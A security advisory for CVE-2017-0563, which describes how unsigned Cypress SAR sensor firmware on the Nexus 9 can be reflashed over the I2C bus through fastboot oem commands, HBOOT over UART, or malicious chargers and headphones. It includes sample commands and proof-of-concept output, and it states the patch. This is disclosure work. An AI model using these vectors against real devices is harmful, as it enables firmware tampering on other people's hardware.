
*Date*: Thu, 4 May 2017 06:15:21 +0000

Title:
====
Google Nexus 9 Cypress SAR Firmware Injection via I2C

Identifier:
========
CVE-2017-0563

Product:
=======
Google Nexus 9

Vulnerable Version:
================
Nexus 9 Android Builds before N4F27B - May 2017, i.e. before bootloader 3.50.0.0143.

Mitigation:
=========
Install N4F27B or later (bootloader version 3.50.0.0143).

Technical Details:
==============
The Nexus 9 device contains a sensor SoC manufactured by Cypress. The sensor is managed by a driver available under
drivers/input/touchscreen/cy8c_sar.c. The driver uses the sensor's data in order to regulate the radiation level
emitted by the device.

The sensor communicates with the application processor via I2C bus #1, which also provides a firmware update interface.
During the platform boot, the driver samples the SoC's firmware's version via chip address 0x5{c,d}, register 0x6. If
it is different than the one available under /vendor/firmware/sar{0,1}.img, it initiates with a firmware flashing
process (via I2C chip address 0x6{0,1}). It seems though that the firmware is not signed by Cypress, thus anyone having
access to the I2C bus, can reflash the firmware of the SoC.

On Nexus 9 before build N4F27B, the I2C buses could be accessed by an unauthorized bootloader attacker:

1. Via the USB fastboot interface, accessible by the fastboot oem {i2cr, i2cw, i2crNoAddr, i2cwNoAddr} commands.
2. Via the HBOOT interface, available through UART (exposed by the headphones jack).

These vectors are especially significant because theoretically they can be used by either a physical attacker
(rebooting the device into fastboot) or by malicious chargers / headphones. For example, a malicious charger connected
to an ADB-enabled device may reboot the device into fastboot if the user authorizes the charger. As for headphones, on
builds before N4F26T they could reboot the device into HBOOT by issuing 'reboot oem-42' on the FIQ debugger prompt [3].

Full details can be found on our vulnerability report [1].

Patch:
=====
Google patched the vulnerability on build N4F27B / bootloader 3.50.0.0143 by restricting access to the I2C buses - The
I2C related bootloader commands are no longer available.
Please note that although Google published the advisory on the April 2017 Security Bulletin [4], the patch has been
included only since the April 5 2017 Security Patch Level, where the April Nexus 9 image (N4F26X) has the April 1 2017
Security Patch Level, hence it does not contain the patched bootloader.

# Google Nexus 9 Cypress SAR Firmware Injection via I2C

Aleph Research Advisory

## Identifier

[CVE-2017-0563](/vulns/aleph-2017009)
## Severity

Critical
## Product

Google Nexus 9

## Vulnerable Version

Nexus 9 Android Builds before N4F27B - May 2017, i.e. before bootloader 3.50.0.0143.

## Mitigation

Install N4F27B or later (bootloader version 3.50.0.0143).

## Technical Details

The Nexus 9 device contains a sensor SoC manufactured by Cypress. The sensor is managed by a driver available under [drivers/input/touchscreen/cy8c\_sar.c](https://android.googlesource.com/kernel/tegra/%2B/android-7.1.1_r0.53/drivers/input/touchscreen/cy8c_sar.c). The driver uses the sensor’s data in order to regulate the radiation level emitted by the device.

The sensor communicates with the application processor via I\(^2\)C bus #1, which also provides a firmware update interface. During the platform boot, the driver samples the SoC’s firmware’s version via chip address `0x5{c,d}`, register `0x6`. If it is different than the one available under `/vendor/firmware/sar{0,1}.img`, it initiates with a firmware flashing process (via I\(^2\)C chip address `0x6{0,1}`). It seems though that the firmware is not signed by Cypress, thus anyone having access to the I\(^2\)C bus, can reflash the firmware of the SoC.

On Nexus 9 before build `N4F27B`, the I\(^2\)C bus could be accessed in four ways:

1. Directly by the kernel.
2. Via the `/dev/i2c-N` character devices. However, as per the SElinux policy in Nexus 9, these devices have the `i2c_device` context which can only be accessed when one is under the `su` domain – only available on `eng`/`userdebug` builds, i.e. **not on production**.
3. Via the USB fastboot interface, accessible by the `fastboot oem {i2cr, i2cw, i2crNoAddr, i2cwNoAddr}` commands:
   ```
   $ fastboot oem i2cr 1 0xb8 6 1
   ...
   (bootloader) ret:0
   (bootloader) > [1] = 1f 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
   OKAY [  0.012s]
   finished. total time: 0.013s

   ```
4. Via the `HBOOT` interface, available by UART (exposed by the headphones jack). The I\(^2\)C buses could be accessed by the `i2cr`, `i2cw`, `i2crNoAddr`, `i2cwNoAddr` commands:

```
hboot> i2cr 1 0xb8 6 1
ret:0
     > [1] = 1f 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0

hboot>

```

Vectors 3 & 4 are especially significant because theoretically they can be used by either a physical attacker (rebooting the device into `fastboot`) or by **malicious chargers / headphones**. For example, a malicious charger connected to an ADB-enabled device may reboot the device into fastboot if the user authorizes the charger. As for headphones, on builds before `N4F26T` they could reboot the device into `HBOOT` by issuing `reboot oem-42` on the `FIQ` debugger prompt. See [our blog post](https://alephsecurity.com/2017/03/08/nexus9-fiq-debugger/) for more details.

## Proof-of-Concept

To demonstrate the SoC can be attacked via I\(^2\)C, we modified its firmware image. Then we managed to flash the modified image via the I\(^2\)C bus by the second vector using `i2ctools` (i.e. the test device ran our own AOSP-compiled, non-production build). The first firmware image we flashed, [available on GitHub](https://github.com/alephsecurity/PoCs/tree/master/CVE-2017-0563) increases the version to `0x3f`:

```
flounder:/ # /data/local/tmp/i2cget -f -y 1 0x5c 0x6
/data/local/tmp/i2cget -f -y 1 0x5c 0x6
0x3f
flounder:/ #

```

The second broke the operation of the chip – from that point forward, we could not reflash the chip since it stopped responding via I\(^2\)C:

```
[   21.431832] CYPRESS_SAR: probe of 1-005d failed with error -1
[   61.118692] [SAR] active=80

```

As for the 3rd and 4th vectors, HBOOT limits the number of command arguments to 16 which creates a technical difficulty controlling the last bytes of each firmware image line (which also contains the checksum) during the flashing process, however further research may show it can be bypassed as well.

## Patch

Google patched the vulnerability on build `N4F27B` / bootloader `3.50.0.0143` by restricting access to the I\(^2\)C buses – removing vectors 3 and 4. The I\(^2\)C related bootloader commands are no longer available:

```
$ fastboot oem i2cr 1 0xb8 6 1
...
(bootloader) [ERR] Command error !!!
OKAY [  0.011s]

finished. total time: 0.012s

```

Please note that although Google published the advisory on the April Security Bulletin, the patch has been included only since the April 5 2017 Security Patch Level, where the April Nexus 9 image (`N4F26X`) has the April 1 2017 Security Patch Level, hence it does not contain the patched bootloader.
